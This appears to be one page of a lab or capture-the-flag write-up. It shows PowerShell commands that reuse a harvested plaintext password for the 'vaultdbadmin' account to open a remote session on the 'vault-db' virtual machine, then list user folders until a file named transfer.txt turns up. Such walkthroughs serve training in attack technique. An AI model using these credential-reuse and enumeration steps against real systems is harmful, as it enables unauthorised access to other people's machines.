---
layout: default
---

## vault-db.gcbvault.local

From vault-srv machine access to vault-db Vistual machine with credentials extracted for vault-dc.gcbvault.local:


### 1. Create new session for vaultdbadmin user

```
PS C:\Windows\SoftwareDistribution\Download\Install> $password = ConvertTo-SecureString 'SafePass123' -AsPlainText -Force
PS C:\Windows\SoftwareDistribution\Download\Install> $credential = New-Object System.Management.Automation.PSCredential ('vault\vaultdbadmin', $password)
PS C:\Windows\SoftwareDistribution\Download\Install> Invoke-Command -scriptblock {whoami} -VMName vault-db -Credential $credential

vault\vaultdbadmin
PS C:\Windows\SoftwareDistribution\Download\Install> PS C:\Windows\SoftwareDistribution\Download\Install> $dbsession= New-PSSession -VMName vault-db -Credential $credential
PS C:\Windows\SoftwareDistribution\Download\Install> $dbsession

 Id Name            ComputerName    ComputerType    State         ConfigurationName    Availability
 -- ----            ------------    ------------    -----         -----------------    ------------
  1 WinRM1          vault-db        VirtualMachine  Opened                                Available





```


### 3. Enumerate and look for the transference file

```
PS C:\> Invoke-Command -Session $dbsession -scriptblock { ls C:\Users\}


    Directory: C:\Users


Mode                LastWriteTime         Length Name                      PSComputerName
----                -------------         ------ ----                      --------------
d-----        8/23/2019   5:18 AM                Administrator             vault-db
d-r---        5/25/2019   3:25 AM                Public                    vault-db
d-----        7/16/2021   5:10 AM                vaultdbadmin              vault-db


PS C:\> Invoke-Command -Session $dbsession -scriptblock { ls C:\Users\Administrator\}


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name                      PSComputerName
----                -------------         ------ ----                      --------------
d-r---        5/26/2019   9:22 AM                3D Objects                vault-db
d-r---        5/26/2019   9:22 AM                Contacts                  vault-db
d-r---        5/26/2019   9:22 AM                Desktop                   vault-db
d-r---        5/26/2019   9:22 AM                Documents                 vault-db
d-r---        5/26/2019   9:22 AM                Downloads                 vault-db
d-r---        5/26/2019   9:22 AM                Favorites                 vault-db
d-r---        5/26/2019   9:22 AM                Links                     vault-db
d-r---        5/26/2019   9:22 AM                Music                     vault-db
d-r---        5/26/2019   9:22 AM                Pictures                  vault-db
d-r---        5/26/2019   9:22 AM                Saved Games               vault-db
d-r---        5/26/2019   9:22 AM                Searches                  vault-db
d-r---        5/26/2019   9:22 AM                Videos                    vault-db


PS C:\> Invoke-Command -Session $dbsession -scriptblock { ls C:\Users\Administrator\Desktop}
PS C:\> Invoke-Command -Session $dbsession -scriptblock { ls C:\Users\Administrator\Documents}
PS C:\> Invoke-Command -Session $dbsession -scriptblock { ls C:\Users\vaultdbadmin\}


    Directory: C:\Users\vaultdbadmin


Mode                LastWriteTime         Length Name                      PSComputerName
----                -------------         ------ ----                      --------------
d-r---        9/11/2019   7:11 AM                3D Objects                vault-db
d-r---        9/11/2019   7:11 AM                Contacts                  vault-db
d-r---        11/7/2019   8:10 PM                Desktop                   vault-db
d-r---        9/11/2019   7:11 AM                Documents                 vault-db
d-r---        9/11/2019   7:11 AM                Downloads                 vault-db
d-r---        9/11/2019   7:11 AM                Favorites                 vault-db
d-r---        9/11/2019   7:11 AM                Links                     vault-db
d-r---        9/11/2019   7:11 AM                Music                     vault-db
d-r---        9/11/2019   7:11 AM                Pictures                  vault-db
d-r---        9/11/2019   7:11 AM                Saved Games               vault-db
d-r---        9/11/2019   7:11 AM                Searches                  vault-db
d-r---        9/11/2019   7:11 AM                Videos                    vault-db


PS C:\> Invoke-Command -Session $dbsession -scriptblock { ls C:\Users\vaultdbadmin\Documents\}
PS C:\> Invoke-Command -Session $dbsession -scriptblock { ls C:\Users\vaultdbadmin\Desktop\}


    Directory: C:\Users\vaultdbadmin\Desktop


Mode                LastWriteTime         Length Name                      PSComputerName
----                -------------         ------ ----                      --------------
-a----        8/14/2020   6:20 AM             32 transfer.txt              vault-db


```

cat transfer.txt


[back](./section8.html)
